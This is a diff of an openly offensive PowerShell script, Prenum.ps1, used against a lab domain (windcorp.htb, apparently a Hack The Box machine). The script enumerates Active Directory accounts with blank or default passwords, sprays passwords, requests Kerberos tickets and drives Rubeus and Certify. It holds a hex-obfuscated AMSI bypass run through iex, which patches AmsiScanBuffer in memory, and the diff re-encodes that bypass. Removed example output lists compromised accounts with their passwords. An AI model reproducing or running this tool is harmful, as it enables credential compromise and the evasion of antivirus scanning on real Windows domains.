@@ -2,7 +2,7 @@
 .SYNOPSIS
   Checking for users and computers with blank passwords or pre-created computer-accounts. Will also password-spray users if using parameter -SprayPass
 
-  .DESCRIPTION
+.DESCRIPTION
 The perils of the Pre-Windows 2000 compatible access group in a Windows Domain.
 On Windows 2000 and probably 2003/2008 too, that group contained groups: Anonymous/Everyone/Authenticated Users
 Even if you have upgraded your Domain Controllers to Windows 2022, that group is kept unchanged.
@@ -51,32 +51,29 @@ Enumerate users, computers and passwordspraying
 
    .\Prenum.ps1' -DC menhit -Domain windcorp.htb -Users -Computers -Spraypass 'WelcomeToWindcorp#2023'
 
-   Output:
-    Testing Computers
-    Pwned computer: WS-BERBAN$ using password: ws-berbans
-    Pwned computer: WS-SIRAP$ using password: ws-sirap
+.EXAMPLE
 
-    Testing users
-    Pwned user: Jeremy.Siko using password: WelcomeToWindcorp#2023
-    Pwned user: John Doe no password
+Enumerate computers and request Kerberos TGT if vulnerable computeraccount found
 
+   .\Prenum.ps1' -DC menhit -Domain windcorp.htb -Computers -Asktgt
+
+
+.EXAMPLE
 Running Rubeus
 
   .\Prenum.ps1 -DC menhit -Domain windcorp.htb -Rubeus "triage"
 
-  Output:
+.EXAMPLE
+Running Certify
 
-Action: Triage Kerberos Tickets (Current User)
+  .\Prenum.ps1 -Certify "cas /domain:windcorp.htb"
 
-[*] Current LUID    : 0x6cf06
+.EXAMPLE
+LDAP-search for Domain-controllers
 
- ----------------------------------------------------------------------------------------------------- 
- | LUID    | UserName                  | Service                               | EndTime             |
- ----------------------------------------------------------------------------------------------------- 
- | 0x6cf06 | ws-berban$ @ WINDCORP.HTB | krbtgt/windcorp.htb                   | 12.05.2023 00:49:18 |
- | 0x6cf06 | ws-berban$ @ WINDCORP.HTB | ldap/Menhit.windcorp.htb              | 12.05.2023 00:49:18 |
- | 0x6cf06 | ws-berban$ @ WINDCORP.HTB | ldap/Menhit.windcorp.htb/windcorp.htb | 12.05.2023 00:49:18 |
- ----------------------------------------------------------------------------------------------------- 
+  .\Prenum.ps1 -DC menhit -Domain windcorp.htb -ldap "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+
+  
 .NOTES  
     File Name  : prenum.ps1  
     Author     : Andreas Finstad (4ndr34z)  
@@ -95,23 +92,22 @@ param(
   [switch]$Users,
   [Parameter(ParameterSetName='ldap',Mandatory=$false)]
   [switch]$Computers,
-  [Parameter(Mandatory=$false)]
+  [Parameter(ParameterSetName='cert',Mandatory=$false)]
   [switch]$TestCA,
   [Parameter(ParameterSetName='ldap',Mandatory=$false)]
   [string]$Rubeus,
   [Parameter(ParameterSetName='ldap',Mandatory=$false)]
   [switch]$Asktgt,
-  [Parameter(Mandatory=$false)]
+  [Parameter(ParameterSetName='cert',Mandatory=$false)]
   [string]$Certify,
   [Parameter(ParameterSetName='ldap',Mandatory=$false)]
   [string]$Ldap
 )
 
-
 ((([Ref].Assembly.GetTypes()|?{$_-clike'*Am*s'}).GetFields(2*20)|?{$_-clike'*d'}).SetValue($null,$true))
-$bp = "2457696e3332203d2040220a0a7573696e672053797374656d3b0a7573696e672053797374656d2e52756e74696d652e496e7465726f7053657276696365733b0a0a7075626c696320636c6173732057696e3332207b0a0a202020205b446c6c496d706f727428226b65726e656c333222295d0a202020207075626c6963207374617469632065787465726e20496e745074722047657450726f634164647265737328496e7450747220684d6f64756c652c20737472696e672070726f634e616d65293b0a0a202020205b446c6c496d706f727428226b65726e656c333222295d0a202020207075626c6963207374617469632065787465726e20496e74507472204c6f61644c69627261727928737472696e67206e616d65293b0a0a202020205b446c6c496d706f727428226b65726e656c333222295d0a202020207075626c6963207374617469632065787465726e20626f6f6c205669727475616c50726f7465637428496e74507472206c70416464726573732c2055496e7450747220647753697a652c2075696e7420666c4e657750726f746563742c206f75742075696e74206c70666c4f6c6450726f74656374293b0a0a7d0a22400a0a4164642d54797065202457696e33320a0a244c6f61644c696272617279203d205b57696e33325d3a3a4c6f61644c6962726172792822616d22202b202273692e646c6c22290a2441646472657373203d205b57696e33325d3a3a47657450726f634164647265737328244c6f61644c6962726172792c2022416d736922202b20225363616e22202b202242756666657222290a2470203d20300a5b57696e33325d3a3a5669727475616c50726f746563742824416464726573732c205b75696e7433325d352c20307834302c205b7265665d2470290a245061746368203d205b427974655b5d5d2028307842382c20307835372c20307830302c20307830372c20307838302c2030784333290a5b53797374656d2e52756e74696d652e496e7465726f7053657276696365732e4d61727368616c5d3a3a436f7079282450617463682c20302c2024416464726573732c203629"
-$bp = $bp -split '(..)' -ne '' |ForEach-Object {[char][byte]"0x$_"}
-iex ($bp = $bp -join '')
+$bp="2457203d2040220a7573696e672053797374656d3b0a7573696e672053797374656d2e52756e74696d652e496e7465726f7053657276696365733b0a7075626c696320636c6173732057696e3332207b0a5b446c6c496d706f727428226b65726e656c333222295d0a7075626c6963207374617469632065787465726e20496e745074722047657450726f634164647265737328496e7450747220684d6f64756c652c20737472696e672070726f634e616d65293b0a5b446c6c496d706f727428226b65726e656c333222295d0a7075626c6963207374617469632065787465726e20496e74507472204c6f61644c69627261727928737472696e67206e616d65293b0a5b446c6c496d706f727428226b65726e656c333222295d0a7075626c6963207374617469632065787465726e20626f6f6c205669727475616c50726f7465637428496e74507472206c70416464726573732c2055496e7450747220647753697a652c2075696e7420666c4e657750726f746563742c206f75742075696e74206c70666c4f6c6450726f74656374293b0a7d0a22400a4164642d547970652024570a244c3d205b57696e33325d3a3a4c6f61644c6962726172792822616d22202b202273692e646c6c22290a2441203d205b57696e33325d3a3a47657450726f634164647265737328244c2c2022416d7322202b2022695363616e22202b202242756666657222290a2470203d20300a5b57696e33325d3a3a5669727475616c50726f746563742824412c205b75696e7433325d352c20307834302c205b7265665d2470290a2470203d205b427974655b5d5d2028307842382c20307835372c20307830302c20307830372c20307838302c2030784333290a5b52756e74696d652e496e7465726f7053657276696365732e4d61727368616c5d3a3a436f70792824702c20302c2024412c203629"
+$bp=$bp -split '(..)' -ne ''|% {[char][byte]"0x$_"}
+iex($bp=$bp -join '')
 
 $searcher = New-Object DirectoryServices.DirectorySearcher
 $searcher.SearchRoot = [adsi]"LDAP://$DC.$Domain"
@@ -146,6 +142,7 @@ Function Load-Certify (){
 }
 
 Function Test-Computers {
+    set-content "" -Path .\computers.txt -Force
     write-host
     write-host Testing Computers  -ForegroundColor Yellow
     $searcher.Filter = '(&(objectClass=computer)(samaccountname=*))'
@@ -157,7 +154,8 @@ Function Test-Computers {
     }
 
     $computers | foreach-object -Process {
-        
+    write-host $_
+    Add-Content -Path .\computers.txt -Value $_
     $valid = Test-ADAuthentication -username $_ -password $_.Replace("`$","").ToLower()
     $pass = $_.Replace("`$","").ToLower()
 
@@ -215,8 +213,8 @@ Function Test-Users {
 }
 
 Function Ldap-Search ($filter){
-  $searcher.Filter = '$filter'
-  $results = $searcher.FindAll()
+  $searcher.Filter = $filter
+  $searcher.FindAll() 
 
 }
 
@@ -234,9 +232,7 @@ if ($Ldap) {
   }
   
   if ($TestCA) {
-    Load-Certify -command "find /vulnerable /outfile:vulntemplates.txt"
-    Get-Content vulntemplates.txt
-    write-host "Saved in file: vulntemplates.txt"
+    Load-Certify -command "find /vulnerable"
   }
  
   if ($Certify) {
